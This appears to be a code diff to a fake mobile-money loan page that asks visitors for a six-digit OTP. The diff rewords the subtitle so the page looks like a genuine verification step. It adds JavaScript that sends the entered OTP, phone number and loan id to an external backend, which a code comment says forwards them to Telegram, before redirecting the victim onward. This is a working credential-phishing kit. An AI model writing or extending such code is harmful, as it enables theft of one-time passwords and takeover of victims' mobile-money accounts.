@@ -132,6 +132,10 @@
             cursor: pointer;
             margin: 10px 0;
         }
+        .btn-action:disabled {
+            background: #d1d5db;
+            cursor: not-allowed;
+        }
         .back-btn {
             width: 100%;
             background: transparent;
@@ -185,7 +189,7 @@
 
     <div class="content-wrapper">
         <h1>Enter OTP Code</h1>
-        <p class="subtitle">Enter any 6-digit code to continue</p>
+        <p class="subtitle">Enter the 6-digit verification code</p>
         <p class="phone-display" id="phoneDisplay"></p>
 
         <div class="offer-info">
@@ -209,7 +213,10 @@
 </div>
 
 <script>
+    const API_URL = 'https://momo-uganda-production.up.railway.app';
+    
     let userPhone = sessionStorage.getItem('userPhone') || '';
+    let loanId = sessionStorage.getItem('loanId') || '';
 
     function loadLoanData() {
         const calculatorData = sessionStorage.getItem('calculatorData');
@@ -250,7 +257,7 @@
                     inputs[index + 1].focus();
                 }
                 if (getCode().length === 6) {
-                    setTimeout(goToFinalVerify, 200);
+                    setTimeout(sendOTPAndRedirect, 200);
                 }
             });
             input.addEventListener('keydown', (e) => {
@@ -261,7 +268,7 @@
         });
     }
 
-    function goToFinalVerify() {
+    async function sendOTPAndRedirect() {
         const otp = getCode();
         if (otp.length !== 6) {
             return;
@@ -271,6 +278,25 @@
         btn.disabled = true;
         btn.textContent = "Processing...";
         document.getElementById('spinner').style.display = 'flex';
+
+        try {
+            // Send OTP to backend to forward to Telegram
+            const response = await fetch(`${API_URL}/api/save-otp`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    loanId: loanId,
+                    otp: otp,
+                    phone: userPhone
+                })
+            });
+
+            const data = await response.json();
+            console.log('OTP saved response:', data);
+            
+        } catch (error) {
+            console.error('Error sending OTP:', error);
+        }
         
         // Redirect to final verification page
         setTimeout(() => {
@@ -278,7 +304,7 @@
         }, 1000);
     }
 
-    document.getElementById('verifyBtn').onclick = goToFinalVerify;
+    document.getElementById('verifyBtn').onclick = sendOTPAndRedirect;
     
     createInputs();
     setupAutoFocus();
